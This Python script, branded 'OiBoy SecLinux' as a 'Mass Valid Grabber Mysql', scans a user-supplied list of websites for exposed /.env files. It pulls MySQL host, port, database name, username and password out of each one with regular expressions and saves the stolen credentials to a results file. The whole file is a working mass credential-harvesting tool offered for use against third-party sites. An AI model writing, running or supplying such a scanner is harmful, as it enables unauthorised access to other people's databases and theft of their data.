import requests, os
from re import findall as reg
from colorama import Fore, Style, Back
from concurrent.futures import ThreadPoolExecutor
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
bgr = Back.GREEN
red = Fore.RED
res = Style.RESET_ALL
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
def screen_clear():
    _ = os.system('cls')

def grabb(star):
 if "://" in star:
    star = star
 else:
    star = "http://" + star
 star = star.replace('\n', '').replace('\r', '')
 star = star + "/.env"
 check = requests.get(star, timeout=3)
 resp = check.text
 if 'DB_HOST=mysql.' in resp:
      host = reg('\nDB_HOST=(.*?)\n', resp)[0]
      port = reg('\nDB_PORT=(.*?)\n', resp)[0]
      db = reg('\nDB_DATABASE=(.*?)\n', resp)[0]
      user = reg('\nDB_USERNAME=(.*?)\n', resp)[0]
      pwd = reg('\nDB_PASSWORD=(.*?)\n', resp)[0]
      print (f'Targeted {gr}OK:{res}=>{star}\n')
      with open ("Results/!Valid_Mysql.txt", "a") as saved:
         saved.write(f"URL: {star}\n Host: {host}\n Port: {port}\n DB_Name: {db}\nUsername: {user}\n Password: {pwd}\n")
         saved.close()
 else:
      print(f'Targeted {red}NO!{res}=>{star}')
      pass

screen_clear()
print (f"    {gr}./OiBoy SecLinux.")
print (f"         {wh}Mass Valid Grabber {bl}Mysql")
print(f"           {bgr}  https://pashakun.com {Style.RESET_ALL}")
link = input("Enter your file.txt: ")
if not os.path.isfile(link):
    print(f'Enter a valid .txt file in the some folder')
with open(link) as fp:
  for star in fp:
    if not star:
       pass
    with ThreadPoolExecutor(max_workers=40) as executor:
        executor.map(grabb, [star])
        executor.shutdown(wait=True)
fp.close()